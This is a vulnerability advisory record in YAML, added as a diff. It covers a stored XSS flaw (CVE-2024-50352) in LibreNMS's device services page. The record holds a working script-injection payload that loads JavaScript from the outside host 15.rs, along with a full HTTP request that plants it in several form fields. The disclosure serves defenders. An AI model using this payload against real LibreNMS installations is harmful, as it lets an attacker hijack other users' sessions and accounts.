@@ -1,0 +1,73 @@
+advisory_id: GHSA-qr8f-5qqg-j3wg
+datasource_id: github_osv_importer_v2/GHSA-qr8f-5qqg-j3wg
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-qr8f-5qqg-j3wg/GHSA-qr8f-5qqg-j3wg.json
+aliases:
+  - CVE-2024-50352
+summary: |
+  LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/device/overview/services.inc.php
+  ### Summary
+  A Stored Cross-Site Scripting (XSS) vulnerability in the "Services" section of the Device Overview page allows authenticated users to inject arbitrary JavaScript through the "name" parameter when adding a service to a device. This vulnerability could result in the execution of malicious code in the context of other users' sessions, potentially compromising their accounts and enabling unauthorized actions.
+
+  ### Details
+  When creating a device through the "edit device -> services" workflow (example path: "/device/15/edit/section=services"), the attacker can inject an XSS payload in the "name" parameter. This payload is then reflected in the "Services" section of the "Overview" page of the device. It is important to note that the vulnerability does not exist when creating devices through the normal "Add Service" interface (created through the ajax_form.php request with the "type=create-service").
+
+  The payload used to exploit this vulnerability is:
+  ```Name'"><script/src=//15.rs></script>```
+
+  Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.
+
+  The root cause is the application's failure to sanitize the "name" parameter before outputting it in the HTML. The sinks are as follows:
+  https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/overview/services.inc.php#L36
+  https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/overview.inc.php#L74
+
+  ### PoC
+  1. Create a service for a device using the following payload in the "name" parameter:
+  ```Name'"><script/src=//15.rs></script>```
+  2. Save the service.
+  3. Navigate to the "Overview" page of the device.
+  4. Observe that the injected script executes in the "Services" section of the page.
+
+  Example Request:
+
+  ```http
+  POST /device/15/edit/section=services HTTP/1.1
+  Host: <your_host>
+  Content-Type: application/x-www-form-urlencoded
+  Cookie: <your_cookie>
+
+  _token=<your_token>&name=Name'"><script/src=//15.rs></script>&addsrv=yes&device=15&type=pollen&descr=Descr'"><script/src=//15.rs></script>&ip=IP'"><script/src=//15.rs></script>&params=Params'"><script/src=//15.rs></script>&Submit=
+  ```
+
+  ### Impact
+
+  This vulnerability allows authenticated users to inject and execute arbitrary JavaScript in the context of other users' sessions when they visit the "Services" section of the device's overview page. This could result in the compromise of user accounts and unauthorized actions performed on their behalf.
+impacted_packages:
+  - purl: pkg:composer/librenms/librenms
+    affected_versions: vers:composer/<=24.9.1
+    fixed_versions: vers:composer/24.10.0
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-qr8f-5qqg-j3wg/GHSA-qr8f-5qqg-j3wg.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/librenms/librenms
+    reference_type:
+    reference_id:
+  - url: https://github.com/librenms/librenms/commit/b4af778ca42c5839801f16ece53505bb7fa1e7bc
+    reference_type:
+    reference_id:
+  - url: https://github.com/librenms/librenms/security/advisories/GHSA-qr8f-5qqg-j3wg
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-50352
+    reference_type:
+    reference_id:
